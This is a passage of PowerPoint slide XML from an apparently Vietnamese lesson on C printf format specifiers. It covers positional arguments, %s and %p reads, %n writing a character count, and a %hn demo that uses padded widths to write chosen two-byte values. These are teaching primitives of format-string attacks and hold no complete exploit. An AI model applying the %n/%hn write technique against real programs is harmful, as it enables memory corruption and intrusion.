            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Ta có thể chọn argument theo index:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("%2$s %1$d\n", 7, "chào");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>chào 7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("%1$d %1$d\n", 9);      // dùng lại cùng arg</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>9 9</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="78" name="Picture 3" descr="printf.jpg"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="914400"/>
            <a:ext cx="4489920" cy="434196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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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READ %s — code demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="4570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2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>char secret[] = "TOP SECRET";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>char *p = secret;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("[read] %s\n", p);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>[read] TOP SECRET</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("address: %p\n", p);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>address: 0x5xxxxxxxxx</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>=&gt; Vì p ở đây là pointer chứa địa chỉ nên ta có thể thấy hàm này khá đặc biệt vì nó </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>không in địa chỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> ra mà nó </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>dereference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> cái </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>địa chỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> ấy để </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>lấy value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> ra và in value đó ra.</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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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WRITE %n — code demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="6270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0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>int x = 0;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("AAAA%n\n", &amp;x);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>AAAA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("x = %d\n", x);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>X = 4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>%n là một format specifier khá đặc biệt trong C vì nó không in bất kỳ ký tự nào ra màn hình.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Thay vào đó, nó nhận một con trỏ đến biến và ghi vào biến đó </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>SỐ LƯỢNG</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> ký tự đã được printf xử lý trước khi gặp %n.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Ví dụ, trong printf("AAAA%n\n", &amp;x), có 4 ký tự A đứng trước %n, nên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>x nhận giá trị 4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pP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TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="260604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%hn: ghi 2 byte</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1578600"/>
            <a:ext cx="10964880" cy="4136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2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>short lo = 0, hi = 0;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>%1056c%hn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="650953"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>%3863c%hn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>", 0, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;lo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>, 0, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
